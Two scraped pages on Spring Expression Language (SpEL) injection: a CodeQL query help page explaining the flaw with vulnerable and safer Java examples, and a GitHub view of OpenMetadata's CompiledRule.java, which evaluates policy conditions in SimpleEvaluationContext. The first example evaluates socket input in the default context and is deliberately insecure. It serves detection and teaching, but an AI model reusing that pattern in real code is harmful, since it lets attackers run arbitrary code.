  + [Dereferenced expression may be null](../java-dereferenced-expr-may-be-null/)
  + [Dereferenced variable is always null](../java-dereferenced-value-is-always-null/)
  + [Dereferenced variable may be null](../java-dereferenced-value-may-be-null/)
  + [Deserialization of user-controlled data](../java-unsafe-deserialization/)
  + [Detect JHipster Generator Vulnerability CVE-2019-16303](../java-jhipster-prng/)
  + [Direct call to a run() method](../java-call-to-thread-run/)
  + [Disabled Netty HTTP header validation](../java-netty-http-request-or-response-splitting/)
  + [Disabled Spring CSRF protection](../java-spring-disabled-csrf-protection/)
  + [Double-checked locking is not thread-safe](../java-unsafe-double-checked-locking/)
  + [Equals method does not inspect argument type](../java-unchecked-cast-in-equals/)
  + [Equals on incomparable types](../java-equals-on-unrelated-types/)
  + [Equals or hashCode on arrays](../java-equals-on-arrays/)
  + [Executing a command with a relative path](../java-relative-path-command/)
  + [Exposing internal representation](../java-internal-representation-exposure/)
  + [Exposure of sensitive information to UI text views](../java-android-sensitive-text/)
  + [Exposure of sensitive information to notifications](../java-android-sensitive-notification/)
  + [Expression always evaluates to the same value](../java-evaluation-to-constant/)
  + [Expression language injection (JEXL)](../java-jexl-expression-injection/)
  + [Expression language injection (MVEL)](../java-mvel-expression-injection/)
  + Expression language injection (Spring)
  + [Externalizable but no public no-argument constructor](../java-missing-no-arg-constructor-on-externalizable/)
  + [Failure to use HTTPS or SFTP URL in Maven artifact upload/download](../java-maven-non-https-url/)
  + [Failure to use secure cookies](../java-insecure-cookie/)
  + [Field masks field in super class](../java-field-masks-super-field/)
  + [Finalizer inconsistency](../java-missing-super-finalize/)
  + [Futile synchronization on field](../java-unsafe-sync-on-field/)
  + [Groovy Language injection](../java-groovy-injection/)
  + [HTTP response splitting](../java-http-response-splitting/)
  + [Hard-coded credential in API call](../java-hardcoded-credential-api-call/)
  + [Hashed value without hashCode definition](../java-hashing-without-hashcode/)
  + [Ignored error status of call](../java-ignored-error-status-of-call/)
  + [Implicit conversion from array to string](../java-print-array/)
  + [Implicit narrowing conversion in compound assignment](../java-implicit-cast-in-compound-assignment/)
  + [Implicitly exported Android component](../java-android-implicitly-exported-component/)
  + [Improper validation of user-provided array index](../java-improper-validation-of-array-index/)
  + [Improper validation of user-provided size used for array construction](../java-improper-validation-of-array-construction/)
  + [Improper verification of intent by broadcast receiver](../java-improper-intent-verification/)
  + [Inconsistent compareTo](../java-inconsistent-compareto-and-equals/)
  + [Inconsistent equals and hashCode](../java-inconsistent-equals-and-hashcode/)
  + [Inconsistent synchronization for writeObject()](../java-inconsistent-sync-writeobject/)
  + [Inconsistent synchronization of getter and setter](../java-unsynchronized-getter/)
  + [Incorrect absolute value of random number](../java-abs-of-random/)
  + [Incorrect serialVersionUID field](../java-incorrect-serial-version-uid/)
  + [Inefficient String constructor](../java-inefficient-string-constructor/)
  + [Inefficient empty string test](../java-inefficient-empty-string-test/)
  + [Inefficient output stream](../java-inefficient-output-stream/)
  + [Inefficient primitive constructor](../java-inefficient-boxed-constructor/)
  + [Inefficient regular expression](../java-redos/)
  + [Inefficient use of key set iterator](../java-inefficient-key-set-iterator/)
  + [Information exposure through a stack trace](../java-stack-trace-exposure/)
  + [Information exposure through an error message](../java-error-message-exposure/)
  + [Inner class could be static](../java-non-static-nested-class/)
  + [Insecure Bean Validation](../java-insecure-bean-validation/)
  + [Insecure JavaMail SSL Configuration](../java-insecure-smtp-ssl/)
  + [Insecure LDAP authentication](../java-insecure-ldap-auth/)
  + [Insecure basic authentication](../java-insecure-basic-auth/)
  + [Insecure local authentication](../java-android-insecure-local-authentication/)
  + [Insecure randomness](../java-insecure-randomness/)
  + [Insecurely generated keys for local authentication](../java-android-insecure-local-key-gen/)
  + [Insertion of sensitive information into log files](../java-sensitive-log/)
  + [Intent URI permission manipulation](../java-android-intent-uri-permission-manipulation/)
  + [Interface cannot be implemented](../java-unimplementable-interface/)
  + [Iterable wrapping an iterator](../java-iterable-wraps-iterator/)
  + [Iterator implementing Iterable](../java-iterator-implements-iterable/)
  + [JNDI lookup with user-controlled name](../java-jndi-injection/)
  + [Javadoc has impossible ‘throws’ tag](../java-inconsistent-javadoc-throws/)
  + [LDAP query built from user-controlled sources](../java-ldap-injection/)
  + [Leaking sensitive information through a ResultReceiver](../java-android-sensitive-result-receiver/)
  + [Leaking sensitive information through an implicit Intent](../java-android-sensitive-communication/)
  + [Left shift by more than the type width](../java-lshift-larger-than-type-width/)
  + [Local information disclosure in a temporary directory](../java-local-temp-file-or-directory-information-disclosure/)
  + [Log Injection](../java-log-injection/)
  + [Loop with unreachable exit condition](../java-unreachable-exit-in-loop/)
  + [Misleading indentation](../java-misleading-indentation/)
  + [Missing JWT signature check](../java-missing-jwt-signature-check/)
  + [Missing Override annotation](../java-missing-override-annotation/)
  + [Missing catch of NumberFormatException](../java-uncaught-number-format-exception/)
  + [Missing enum case in switch](../java-missing-case-in-switch/)
  + [Missing format argument](../java-missing-format-argument/)
  + [Missing read or write permission in a content provider](../java-android-incomplete-provider-permissions/)
  + [Missing space in string literal](../java-missing-space-in-concatenation/)
  + [Missing super clone](../java-missing-call-to-super-clone/)
  + [Multiplication of remainder](../java-multiplication-of-remainder/)
  + [Next in hasNext implementation](../java-iterator-hasnext-calls-next/)
  + [No clone method](../java-missing-clone-method/)
  + [Non-final method invocation in constructor](../java-non-final-call-in-constructor/)
  + [Non-synchronized override of synchronized method](../java-non-sync-override/)
  + [OGNL Expression Language statement with user-controlled input](../java-ognl-injection/)
  + [Overloaded compareTo](../java-wrong-compareto-signature/)
  + [Overloaded equals](../java-wrong-equals-signature/)
  + [Overly permissive regular expression range](../java-overly-large-range/)
  + [Partial path traversal vulnerability](../java-partial-path-traversal/)
  + [Partial path traversal vulnerability from remote](../java-partial-path-traversal-from-remote/)
  + [Polynomial regular expression used on uncontrolled data](../java-polynomial-redos/)
  + [Possible confusion of local and field](../java-local-shadows-field/)
  + [Potential database resource leak](../java-database-resource-leak/)
  + [Potential input resource leak](../java-input-resource-leak/)
  + [Potential output resource leak](../java-output-resource-leak/)
  + [Query built by concatenation with a possibly-untrusted string](../java-concatenated-sql-query/)
  + [Query built from user-controlled sources](../java-sql-injection/)
  + [Race condition in double-checked locking object initialization](../java-unsafe-double-checked-locking-init-order/)
  + [Race condition in socket authentication](../java-socket-auth-race-condition/)
  + [Random used only once](../java-random-used-once/)
  + [ReadResolve must have Object return type, not void](../java-wrong-readresolve-signature/)
  + [Reading from a world writable file](../java-world-writable-file-read/)
  + [Reference equality test of boxed types](../java-reference-equality-of-boxed-types/)
  + [Reference equality test on strings](../java-reference-equality-on-strings/)
  + [Regular expression injection](../java-regex-injection/)
  + [Resolving XML external entity in user-controlled data](../java-xxe/)
  + [Result of multiplication cast to wider type](../java-integer-multiplication-cast-to-long/)
  + [Self assignment](../java-redundant-assignment/)
  + [Serializable but no void constructor](../java-missing-no-arg-constructor-on-serializable/)
  + [Serializable inner class of non-serializable class](../java-non-serializable-inner-class/)
  + [Serialization methods do not match required signature](../java-wrong-object-serialization-signature/)
  + [Server-side request forgery](../java-ssrf/)
  + [Server-side template injection](../java-server-side-template-injection/)
  + [Sleep with lock held](../java-sleep-with-lock-held/)
  + [Spin on field](../java-spin-on-field/)
  + [Spurious Javadoc @param tags](../java-unknown-javadoc-parameter/)
  + [Start of thread in constructor](../java-thread-start-in-constructor/)
  + [Subtle call to inherited method](../java-subtle-inherited-call/)
  + [Suspicious date format](../java-suspicious-date-format/)
  + [Synchronization on boxed types or strings](../java-sync-on-boxed-types/)
  + [Thread-unsafe use of DateFormat](../java-thread-unsafe-dateformat/)
  + [Time-of-check time-of-use race condition](../java-toctou-race-condition/)
  + [Trust boundary violation](../java-trust-boundary-violation/)
  + [Type bound extends a final class](../java-type-bound-extends-final/)
  + [Type mismatch on container access](../java-type-mismatch-access/)
  + [Type mismatch on container modification](../java-type-mismatch-modification/)
  + [Type variable hides another type](../java-type-variable-hides-type/)
  + [Typo in equals](../java-equals-typo/)
  + [Typo in hashCode](../java-hashcode-typo/)
  + [Typo in toString](../java-tostring-typo/)
  + [URL forward from a remote source](../java-unvalidated-url-forward/)
  + [URL redirection from remote source](../java-unvalidated-url-redirection/)
  + [Uncontrolled command line](../java-command-line-injection/)
  + [Uncontrolled data in arithmetic expression](../java-uncontrolled-arithmetic/)
  + [Uncontrolled data used in content resolution](../java-android-unsafe-content-uri-resolution/)
  + [Uncontrolled data used in path expression](../java-path-injection/)
  + [Underscore used as identifier](../java-underscore-identifier/)
  + [Unreachable catch clause](../java-unreachable-catch-clause/)
  + [Unread local variable](../java-local-variable-is-never-read/)
  + [Unreleased lock](../java-unreleased-lock/)
  + [Unsafe certificate trust](../java-unsafe-cert-trust/)
  + [Unsafe hostname verification](../java-unsafe-hostname-verification/)
  + [Unsafe resource fetching in Android WebView](../java-android-unsafe-android-webview-fetch/)
  + [Unsafe use of getResource](../java-unsafe-get-resource/)
  + [Unused classes and interfaces](../java-unused-reference-type/)
  + [Unused format argument](../java-unused-format-argument/)
  + [Unused label](../java-unused-label/)
  + [Use of RSA algorithm without OAEP](../java-rsa-without-oaep/)
  + [Use of a broken or risky cryptographic algorithm](../java-weak-cryptographic-algorithm/)
  + [Use of a cryptographic algorithm with insufficient key size](../java-insufficient-key-size/)
  + [Use of a potentially broken or risky cryptographic algorithm](../java-potentially-weak-cryptographic-algorithm/)
  + [Use of a potentially dangerous function](../java-potentially-dangerous-function/)
  + [Use of a predictable seed in a secure random number generator](../java-predictable-seed/)
  + [Use of default toString()](../java-call-to-object-tostring/)
  + [Use of externally-controlled format string](../java-tainted-format-string/)
  + [Use of implicit PendingIntents](../java-android-implicit-pendingintents/)
  + [Useless comparison test](../java-constant-comparison/)
  + [Useless null check](../java-useless-null-check/)
  + [Useless parameter](../java-unused-parameter/)
  + [Useless toString on String](../java-useless-tostring-call/)
  + [Useless type test](../java-useless-type-test/)
  + [User-controlled bypass of sensitive method](../java-user-controlled-bypass/)
  + [User-controlled data in arithmetic expression](../java-tainted-arithmetic/)
  + [User-controlled data in numeric cast](../java-tainted-numeric-cast/)
  + [User-controlled data used in permissions check](../java-tainted-permissions-check/)
  + [Using a static initialization vector for encryption](../java-static-initialization-vector/)
  + [Wait on condition](../java-wait-on-condition-interface/)
  + [Whitespace contradicts operator precedence](../java-whitespace-contradicts-precedence/)
  + [Wrong NaN comparison](../java-comparison-with-nan/)
  + [XPath injection](../java-xml-xpath-injection/)
  + [XSLT transformation with user-controlled stylesheet](../java-xslt-injection/)
  + [`TrustManager` that accepts all certificates](../java-insecure-trustmanager/)
  + [notify instead of notifyAll](../java-notify-instead-of-notify-all/)
* [CodeQL query help for JavaScript and TypeScript](../../javascript/)
* [CodeQL query help for Python](../../python/)
* [CodeQL query help for Ruby](../../ruby/)
* [CodeQL query help for Swift](../../swift/)
* [CodeQL CWE coverage](../../codeql-cwe-coverage/)

* [CodeQL query help documentation](../../) »
* [CodeQL query help for Java and Kotlin](../) »

# Expression language injection (Spring)[¶](#expression-language-injection-spring "Link to this heading")

```
ID: java/spel-expression-injection
Kind: path-problem
Security severity: 9.3
Severity: error
Precision: high
Tags:
   - security
   - external/cwe/cwe-094
Query suites:
   - java-code-scanning.qls
   - java-security-extended.qls
   - java-security-and-quality.qls

```

[Click to see the query in the CodeQL repository](https://github.com/github/codeql/blob/main/java/ql/src/Security/CWE/CWE-094/SpelInjection.ql)

The Spring Expression Language (SpEL) is a powerful expression language provided by the Spring Framework. The language offers many features including invocation of methods available in the JVM. If a SpEL expression is built using attacker-controlled data, and then evaluated in a powerful context, then it may allow the attacker to run arbitrary code.

The `SpelExpressionParser` class parses a SpEL expression string and returns an `Expression` instance that can be then evaluated by calling one of its methods. By default, an expression is evaluated in a powerful `StandardEvaluationContext` that allows the expression to access other methods available in the JVM.

## Recommendation[¶](#recommendation "Link to this heading")

In general, including user input in a SpEL expression should be avoided. If user input must be included in the expression, it should be then evaluated in a limited context that doesn’t allow arbitrary method invocation.

## Example[¶](#example "Link to this heading")

The following example uses untrusted data to build a SpEL expression and then runs it in the default powerful context.

```
public Object evaluate(Socket socket) throws IOException {
  try (BufferedReader reader = new BufferedReader(
      new InputStreamReader(socket.getInputStream()))) {

    String string = reader.readLine();
    ExpressionParser parser = new SpelExpressionParser();
    Expression expression = parser.parseExpression(string);
    return expression.getValue();
  }
}

```

The next example shows how an untrusted SpEL expression can be run in `SimpleEvaluationContext` that doesn’t allow accessing arbitrary methods. However, it’s recommended to avoid using untrusted input in SpEL expressions.

```
public Object evaluate(Socket socket) throws IOException {
  try (BufferedReader reader = new BufferedReader(
      new InputStreamReader(socket.getInputStream()))) {

    String string = reader.readLine();
    ExpressionParser parser = new SpelExpressionParser();
    Expression expression = parser.parseExpression(string);
    SimpleEvaluationContext context
        = SimpleEvaluationContext.forReadWriteDataBinding().build();
    return expression.getValue(context);
  }
}

```

## References[¶](#references "Link to this heading")

* Spring Framework Reference Documentation: [Spring Expression Language (SpEL)](https://docs.spring.io/spring/docs/4.2.x/spring-framework-reference/html/expressions.html).
* OWASP: [Expression Language Injection](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection).
* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).

* ©
   GitHub, Inc.
* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)



=== Content from github.com_28fc0646_20250111_181753.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-metadata%2FOpenMetadata%2Fblob%2Fmain%2Fopenmetadata-service%2Fsrc%2Fmain%2Fjava%2Forg%2Fopenmetadata%2Fservice%2Fsecurity%2Fpolicyevaluator%2FCompiledRule.java)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fopen-metadata%2FOpenMetadata%2Fblob%2Fmain%2Fopenmetadata-service%2Fsrc%2Fmain%2Fjava%2Forg%2Fopenmetadata%2Fservice%2Fsecurity%2Fpolicyevaluator%2FCompiledRule.java)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=open-metadata%2FOpenMetadata)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[open-metadata](/open-metadata)
/
**[OpenMetadata](/open-metadata/OpenMetadata)**
Public

* [Notifications](/login?return_to=%2Fopen-metadata%2FOpenMetadata) You must be signed in to change notification settings
* [Fork
  1.1k](/login?return_to=%2Fopen-metadata%2FOpenMetadata)
* [Star
   5.9k](/login?return_to=%2Fopen-metadata%2FOpenMetadata)

* [Code](/open-metadata/OpenMetadata)
* [Issues
  396](/open-metadata/OpenMetadata/issues)
* [Pull requests
  92](/open-metadata/OpenMetadata/pulls)
* [Discussions](/open-metadata/OpenMetadata/discussions)
* [Actions](/open-metadata/OpenMetadata/actions)
* [Projects
  0](/open-metadata/OpenMetadata/projects)
* [Wiki](/open-metadata/OpenMetadata/wiki)
* [Security](/open-metadata/OpenMetadata/security)
* [Insights](/open-metadata/OpenMetadata/pulse)

Additional navigation options

* [Code](/open-metadata/OpenMetadata)
* [Issues](/open-metadata/OpenMetadata/issues)
* [Pull requests](/open-metadata/OpenMetadata/pulls)
* [Discussions](/open-metadata/OpenMetadata/discussions)
* [Actions](/open-metadata/OpenMetadata/actions)
* [Projects](/open-metadata/OpenMetadata/projects)
* [Wiki](/open-metadata/OpenMetadata/wiki)
* [Security](/open-metadata/OpenMetadata/security)
* [Insights](/open-metadata/OpenMetadata/pulse)

## Files

 main
## Breadcrumbs

1. [OpenMetadata](/open-metadata/OpenMetadata/tree/main)
2. /[openmetadata-service](/open-metadata/OpenMetadata/tree/main/openmetadata-service)
3. /[src](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src)
4. /[main](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src/main)
5. /[java](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src/main/java)
6. /[org](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src/main/java/org)
7. /[openmetadata](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src/main/java/org/openmetadata)
8. /[service](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src/main/java/org/openmetadata/service)
9. /[security](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src/main/java/org/openmetadata/service/security)
10. /[policyevaluator](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src/main/java/org/openmetadata/service/security/policyevaluator)
/
# CompiledRule.java

Copy path Blame  Blame
## Latest commit

## History

[History](/open-metadata/OpenMetadata/commits/main/openmetadata-service/src/main/java/org/openmetadata/service/security/policyevaluator/CompiledRule.java)239 lines (220 loc) · 8.67 KB main
## Breadcrumbs

1. [OpenMetadata](/open-metadata/OpenMetadata/tree/main)
2. /[openmetadata-service](/open-metadata/OpenMetadata/tree/main/openmetadata-service)
3. /[src](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src)
4. /[main](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src/main)
5. /[java](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src/main/java)
6. /[org](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src/main/java/org)
7. /[openmetadata](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src/main/java/org/openmetadata)
8. /[service](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src/main/java/org/openmetadata/service)
9. /[security](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src/main/java/org/openmetadata/service/security)
10. /[policyevaluator](/open-metadata/OpenMetadata/tree/main/openmetadata-service/src/main/java/org/openmetadata/service/security/policyevaluator)
/
# CompiledRule.java

Top
## File metadata and controls

* Code
* Blame

239 lines (220 loc) · 8.67 KB[Raw](https://github.com/open-metadata/OpenMetadata/raw/refs/heads/main/openmetadata-service/src/main/java/org/openmetadata/service/security/policyevaluator/CompiledRule.java)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239package org.openmetadata.service.security.policyevaluator;
import static org.openmetadata.service.Entity.ALL\_RESOURCES;import static org.openmetadata.service.exception.CatalogExceptionMessage.permissionDenied;
import com.fasterxml.jackson.annotation.JsonIgnore;import java.util.Iterator;import java.util.List;import java.util.Map;import lombok.extern.slf4j.Slf4j;import org.openmetadata.schema.entity.policies.accessControl.Rule;import org.openmetadata.schema.type.MetadataOperation;import org.openmetadata.schema.type.Permission;import org.openmetadata.schema.type.Permission.Access;import org.openmetadata.schema.type.ResourcePermission;import org.openmetadata.service.exception.CatalogExceptionMessage;import org.openmetadata.service.security.AuthorizationException;import org.openmetadata.service.security.policyevaluator.SubjectContext.PolicyContext;import org.springframework.expression.Expression;import org.springframework.expression.spel.standard.SpelExpressionParser;import org.springframework.expression.spel.support.SimpleEvaluationContext;
/\*\* This class is used in a single threaded model and hence does not have concurrency support \*/@Slf4jpublic class CompiledRule extends Rule { private static final SpelExpressionParser EXPRESSION\_PARSER = new SpelExpressionParser(); @JsonIgnore private Expression expression;
 public CompiledRule(Rule rule) { super(); this.withName(rule.getName()) .withDescription(rule.getDescription()) .withCondition(rule.getCondition()) .withEffect(rule.getEffect()) .withOperations(rule.getOperations()) .withResources(rule.getResources()); }
 public static Expression parseExpression(String condition) { if (condition == null) { return null; } try { return EXPRESSION\_PARSER.parseExpression(condition); } catch (Exception exception) { throw new IllegalArgumentException( CatalogExceptionMessage.failedToParse(exception.getMessage())); } }
 /\*\* Used only for validating the expressions when new rule is created \*/ public static <T> void validateExpression(String condition, Class<T> clz) { if (condition == null) { return; } Expression expression = parseExpression(condition); RuleEvaluator ruleEvaluator = new RuleEvaluator(); SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding() .withInstanceMethods() .withRootObject(ruleEvaluator) .build(); try { expression.getValue(context, clz); } catch (Exception exception) { // Remove unnecessary class details in the exception message String message = exception.getMessage().replaceAll("on type .\*$", "").replaceAll("on object .\*$", ""); throw new IllegalArgumentException(CatalogExceptionMessage.failedToEvaluate(message)); } }
 public Expression getExpression() { if (this.getCondition() == null) { return null; } if (expression == null) { expression = parseExpression(getCondition()); } return expression; }
 public void evaluateDenyRule( OperationContext operationContext, SubjectContext subjectContext, ResourceContextInterface resourceContext, PolicyContext policyContext) { if (getEffect() != Effect.DENY || !matchResource(operationContext.getResource())) { return; }
 List<MetadataOperation> operations = operationContext.getOperations(resourceContext); for (MetadataOperation operation : operations) { if (matchOperation(operation)) { LOG.debug( "operation {} denied by {}{}{}", operation, policyContext.getRoleName(), policyContext.getPolicyName(), getName()); if (matchExpression(policyContext, subjectContext, resourceContext)) { throw new AuthorizationException( permissionDenied( subjectContext.user().getName(), operation, policyContext.getRoleName(), policyContext.getPolicyName(), getName())); } } } }
 private Access getAccess() { if (getCondition() != null) { return getEffect() == Effect.DENY ? Access.CONDITIONAL\_DENY : Access.CONDITIONAL\_ALLOW; } return getEffect() == Effect.DENY ? Access.DENY : Access.ALLOW; }
 public void evaluateAllowRule( OperationContext operationContext, SubjectContext subjectContext, ResourceContextInterface resourceContext, PolicyContext policyContext) { if (getEffect() != Effect.ALLOW || !matchResource(operationContext.getResource())) { return; }
 Iterator<MetadataOperation> iterator = operationContext.getOperations(resourceContext).listIterator(); while (iterator.hasNext()) { MetadataOperation operation = iterator.next(); if (matchOperation(operation) && matchExpression(policyContext, subjectContext, resourceContext)) { LOG.debug("operation {} allowed", operation); iterator.remove(); } } }
 public void evaluatePermission( Map<String, ResourcePermission> resourcePermissionMap, PolicyContext policyContext) { for (ResourcePermission resourcePermission : resourcePermissionMap.values()) { evaluatePermission(resourcePermission.getResource(), resourcePermission, policyContext); } }
 public void evaluatePermission( String resource, ResourcePermission resourcePermission, PolicyContext policyContext) { if (!matchResource(resource)) { return; } Access access = getAccess(); // Walk through all the operations in the rule and set permissions for (Permission permission : resourcePermission.getPermissions()) { if (matchOperation(permission.getOperation()) && overrideAccess(access, permission.getAccess())) { permission .withAccess(access) .withRole(policyContext.getRoleName()) .withPolicy(policyContext.getPolicyName()) .withRule(this); LOG.debug("Updated permission {}", permission); } } }
 public void evaluatePermission( SubjectContext subjectContext, ResourceContextInterface resourceContext, ResourcePermission resourcePermission, PolicyContext policyContext) { if (!matchResource(resourceContext.getResource())) { return; } // Walk through all the operations in the rule and set permissions for (Permission permission : resourcePermission.getPermissions()) { if (matchOperation(permission.getOperation()) && matchExpression(policyContext, subjectContext, resourceContext)) { Access access = getEffect() == Effect.DENY ? Access.DENY : Access.ALLOW; if (overrideAccess(access, permission.getAccess())) { permission .withAccess(access) .withRole(policyContext.getRoleName()) .withPolicy(policyContext.getPolicyName()) .withRule(this); LOG.debug("Updated permission {}", permission); } } } }
 protected boolean matchResource(String resource) { return (getResources().get(0).equalsIgnoreCase(ALL\_RESOURCES) || getResources().contains(resource)); }
 private boolean matchOperation(MetadataOperation operation) { List<MetadataOperation> operations = getOperations(); if (operations.contains(MetadataOperation.ALL)) { LOG.debug("matched all operations"); return true; // Match all operations } if (operations.contains(MetadataOperation.EDIT\_ALL) && OperationContext.isEditOperation(operation)) { LOG.debug("matched editAll operations"); return true; } if (operations.contains(MetadataOperation.VIEW\_ALL) && OperationContext.isViewOperation(operation)) { LOG.debug("matched viewAll operations"); return true; } return getOperations().contains(operation); }
 private boolean matchExpression( PolicyContext policyContext, SubjectContext subjectContext, ResourceContextInterface resourceContext) { Expression expr = getExpression(); if (expr == null) { return true; } RuleEvaluator ruleEvaluator = new RuleEvaluator(policyContext, subjectContext, resourceContext); SimpleEvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding() .withInstanceMethods() .withRootObject(ruleEvaluator) .build(); return Boolean.TRUE.equals(expr.getValue(context, Boolean.class)); }
 public static boolean overrideAccess(Access newAccess, Access currentAccess) { // Lower the ordinal number of access overrides higher ordinal number return currentAccess.ordinal() > newAccess.ordinal(); }}

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


